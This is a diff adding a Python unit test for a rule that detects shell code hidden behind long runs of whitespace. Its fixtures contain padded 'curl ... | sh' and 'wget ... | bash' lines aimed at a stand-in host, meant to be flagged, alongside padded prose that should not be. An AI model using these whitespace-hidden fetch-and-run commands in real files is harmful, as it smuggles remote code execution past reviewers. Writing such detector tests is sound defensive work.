@@ -87,3 +87,17 @@ def test_collapse_runs_counts_each_long_run() -> None:
     assert collapse_runs(" " * 1200 + "x") == "⟨1,200 spaces⟩x"
     assert collapse_runs(" \t" * 30) == "⟨60 spaces and tabs⟩"
     assert collapse_runs(" " * 39 + "x") == " " * 39 + "x"  # ordinary indentation stays
+
+
+def test_v2_hidden_shell_code_counts() -> None:
+    """v2 (round 4 G): shell code has no `(` or `=`; a tail that chains a command or pipes into
+    a shell is code."""
+    rule = PaddedCode()
+    url = "https://x.invalid/" + "a" * 200
+    chained = "cd /tmp" + "\t" * 150 + f"; curl -s {url} | sh\n"
+    (match,) = rule.evaluate_text(chained)
+    assert match.rule_version == 2
+    piped = "\t" * 150 + f"wget -qO- {url} | bash\n"
+    assert rule.evaluate_text("set -e\n" + piped)
+    prose = "Note:" + " " * 150 + "see the install guide for your platform. " * 6 + "\n"
+    assert rule.evaluate_text(prose) == []
